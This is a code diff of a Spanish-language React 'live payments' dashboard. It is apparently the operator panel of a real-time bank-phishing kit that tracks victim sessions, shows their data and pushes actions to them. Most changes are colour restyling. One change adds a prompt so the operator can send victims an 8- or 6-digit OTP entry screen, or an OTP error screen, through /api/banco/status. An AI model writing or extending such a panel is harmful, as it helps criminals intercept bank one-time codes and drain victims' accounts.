@@ -197,7 +197,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
   // ── Helpers visuales ────────────────────────────────────────────────────────
   const statusBadge = (status: string) => {
     if (!status) return null;
-    if (status === 'fin')  return <span className="px-2 py-0.5 bg-emerald-500/15 text-emerald-400 border border-emerald-500/25 rounded text-[11px] font-bold uppercase">✅ Finalizado</span>;
+    if (status === 'fin')  return <span className="px-2 py-0.5 bg-violet-500/15 text-violet-400 border border-violet-500/25 rounded text-[11px] font-bold uppercase">✅ Finalizado</span>;
     if (status.startsWith('intento')) {
       const m = status.replace('intento_', '').toUpperCase();
       return <span className="px-2 py-0.5 bg-amber-500/15 text-amber-400 border border-amber-500/25 rounded text-[11px] font-bold uppercase">🔔 {m}</span>;
@@ -215,16 +215,26 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
       case 'primary': return 'bg-zinc-800 text-zinc-300 border border-zinc-700 hover:bg-zinc-700 hover:text-white';
       case 'danger':  return 'bg-red-500/10 text-red-400 border border-red-500/20 hover:bg-red-500/20';
       case 'warning': return 'bg-amber-500/10 text-amber-400 border border-amber-500/20 hover:bg-amber-500/20';
-      case 'success': return 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 hover:bg-emerald-500/20';
+      case 'success': return 'bg-violet-500/10 text-violet-400 border border-violet-500/20 hover:bg-violet-500/20';
       default:        return 'bg-zinc-800 text-zinc-300 border border-zinc-700 hover:bg-zinc-700';
     }
   };
 
   const handleAction = async (sessionId: string, action: string) => {
+    let finalAction = action;
+
+    if (action === 'otp') {
+      const is8 = window.confirm('¿El OTP es de 8 dígitos? (Presiona Cancelar si es de 6)');
+      if (is8) finalAction = 'otp8';
+    } else if (action === 'eotp') {
+      const is8 = window.confirm('¿El error OTP es para 8 dígitos? (Presiona Cancelar si es de 6)');
+      if (is8) finalAction = 'eotp8';
+    }
+
     try {
       await fetch('/api/banco/status', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId, action }),
+        body: JSON.stringify({ sessionId, action: finalAction }),
       });
     } catch (e) { console.error(e); }
   };
@@ -256,7 +266,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
   // ── Badge component ─────────────────────────────────────────────────────────
   const TabBadge = ({ count, active }: { count: number; active: boolean }) => (
     <span className={`ml-1.5 min-w-[20px] px-1.5 py-0.5 rounded-full text-[10px] font-bold text-center inline-block ${
-      active ? 'bg-emerald-500 text-white' : count > 0 ? 'bg-zinc-700 text-zinc-300' : 'bg-zinc-800 text-zinc-600'
+      active ? 'bg-violet-500 text-white' : count > 0 ? 'bg-zinc-700 text-zinc-300' : 'bg-zinc-800 text-zinc-600'
     }`}>
       {count}
     </span>
@@ -270,7 +280,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
       <button
         onClick={() => setActiveTab(id)}
         className={`flex items-center px-4 py-2.5 text-xs font-semibold border-b-2 transition-all whitespace-nowrap ${
-          isA ? 'border-emerald-500 text-emerald-400 bg-emerald-500/5'
+          isA ? 'border-violet-500 text-violet-400 bg-violet-500/5'
               : 'border-transparent text-zinc-500 hover:text-zinc-300 hover:bg-zinc-800/40'
         }`}
       >
@@ -282,17 +292,17 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
   };
 
   return (
-    <div className="flex flex-col h-screen bg-zinc-950 text-zinc-100 font-sans overflow-hidden">
+    <div className="flex flex-col h-full w-full bg-stone-950 text-zinc-100 font-sans overflow-hidden">
 
       {/* HEADER */}
-      <header className="flex-none px-5 py-3 border-b border-zinc-800 bg-zinc-900 flex items-center justify-between">
+      <header className="flex-none px-5 py-3 border-b border-stone-800 bg-stone-900 flex items-center justify-between">
         <div className="flex items-center gap-3">
           <span className="relative flex h-3 w-3">
             <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-            <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
+            <span className="relative inline-flex rounded-full h-3 w-3 bg-violet-500"></span>
           </span>
           <div>
-            <h1 className="text-sm font-bold text-emerald-400">Dashboard · Pagos en Vivo</h1>
+            <h1 className="text-sm font-bold text-violet-400">Dashboard · Pagos en Vivo</h1>
             <p className="text-zinc-600 text-[11px] mt-0.5">
               {panelId || 'Global'} · <span className="text-zinc-400">{frontSessions.length} sesiones de pago</span>
               · <span className="text-amber-400">{activos} activas</span>
@@ -306,23 +316,23 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
       </header>
 
       {/* STATS */}
-      <div className="flex-none grid grid-cols-3 gap-px bg-zinc-800 border-b border-zinc-800">
-        <div className="bg-zinc-900/80 px-4 py-2">
+      <div className="flex-none grid grid-cols-3 gap-px bg-zinc-800 border-b border-stone-800">
+        <div className="bg-stone-900/80 px-4 py-2">
           <p className="text-zinc-600 text-[10px] uppercase font-bold">Total sesiones</p>
           <p className="text-xl font-bold text-zinc-100">{frontSessions.length}</p>
         </div>
-        <div className="bg-zinc-900/80 px-4 py-2">
+        <div className="bg-stone-900/80 px-4 py-2">
           <p className="text-zinc-600 text-[10px] uppercase font-bold">Activas</p>
-          <p className="text-xl font-bold text-emerald-400">{activos}</p>
+          <p className="text-xl font-bold text-violet-400">{activos}</p>
         </div>
-        <div className="bg-zinc-900/80 px-4 py-2">
+        <div className="bg-stone-900/80 px-4 py-2">
           <p className="text-zinc-600 text-[10px] uppercase font-bold">Intentos</p>
           <p className="text-xl font-bold text-amber-400">{intentos}</p>
         </div>
       </div>
 
       {/* TABS */}
-      <div className="flex-none border-b border-zinc-800 bg-zinc-900/40 overflow-x-auto">
+      <div className="flex-none border-b border-stone-800 bg-stone-900/40 overflow-x-auto">
         <div className="flex min-w-max">
           {/* Tab Todos */}
           <Tab id="todos" icon="📋" label="Todos" count={frontSessions.length} />
@@ -364,7 +374,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
       <div className="flex-1 overflow-y-auto">
         {loading ? (
           <div className="flex flex-col items-center justify-center h-48 gap-3">
-            <div className="animate-spin rounded-full h-7 w-7 border-b-2 border-emerald-500"></div>
+            <div className="animate-spin rounded-full h-7 w-7 border-b-2 border-violet-500"></div>
             <p className="text-zinc-500 text-sm">Cargando sesiones...</p>
           </div>
         ) : filtered.length === 0 ? (
@@ -394,8 +404,8 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
                   key={s.id}
                   className={`rounded-xl border transition-all ${
                     isActive
-                      ? 'border-emerald-500/40 bg-zinc-900 shadow-[0_0_10px_rgba(16,185,129,0.06)]'
-                      : 'border-zinc-800/70 bg-zinc-900/50'
+                      ? 'border-violet-500/40 bg-stone-900 shadow-[0_0_10px_rgba(16,185,129,0.06)]'
+                      : 'border-stone-800/70 bg-stone-900/50'
                   }`}
                 >
                   {/* Cabecera siempre visible */}
@@ -406,7 +416,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
                     {isActive && (
                       <span className="relative flex h-2 w-2 shrink-0">
                         <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-60"></span>
-                        <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
+                        <span className="relative inline-flex rounded-full h-2 w-2 bg-violet-500"></span>
                       </span>
                     )}
 
@@ -430,7 +440,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
 
                     {/* Total */}
                     {s.total && (
-                      <span className="text-xs font-bold text-emerald-400">💰 ${s.total}</span>
+                      <span className="text-xs font-bold text-violet-400">💰 ${s.total}</span>
                     )}
 
                     {/* Hora + toggle */}
@@ -442,7 +452,7 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
 
                   {/* Detalle expandible */}
                   {isExpanded && (
-                    <div className="border-t border-zinc-800/50 px-4 pb-4 pt-4 grid grid-cols-1 xl:grid-cols-[280px_1fr] gap-5">
+                    <div className="border-t border-stone-800/50 px-4 pb-4 pt-4 grid grid-cols-1 xl:grid-cols-[280px_1fr] gap-5">
 
                       {/* Datos del usuario */}
                       <div className="space-y-3">
@@ -502,9 +512,9 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
                       </div>
 
                       {/* Panel de control */}
-                      <div className="border-t xl:border-t-0 xl:border-l border-zinc-800/50 pt-4 xl:pt-0 xl:pl-5 flex flex-col gap-3">
+                      <div className="border-t xl:border-t-0 xl:border-l border-stone-800/50 pt-4 xl:pt-0 xl:pl-5 flex flex-col gap-3">
                         <p className="text-[10px] font-bold text-zinc-500 uppercase tracking-wider flex items-center gap-1.5">
-                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
+                          <span className="w-1.5 h-1.5 rounded-full bg-violet-500"></span>
                           Panel de Control Rápido
                         </p>
                         {ACTION_GROUPS.map((group, idx) => (
@@ -523,10 +533,10 @@ export default function LiveDashboard({ telegramDta }: { telegramDta?: string })
                             </div>
                           </div>
                         ))}
-                        <div className="mt-auto pt-3 border-t border-zinc-800/50 flex justify-end">
+                        <div className="mt-auto pt-3 border-t border-stone-800/50 flex justify-end">
                           <button
                             onClick={() => handleAction(s.id, 'fin')}
-                            className="px-5 py-2 bg-emerald-600 text-white rounded-lg text-xs font-bold hover:bg-emerald-500 transition-all border border-emerald-500"
+                            className="px-5 py-2 bg-violet-600 text-white rounded-lg text-xs font-bold hover:bg-violet-500 transition-all border border-violet-500"
                           >
                             ✅ Finalizar Sesión
                           </button>
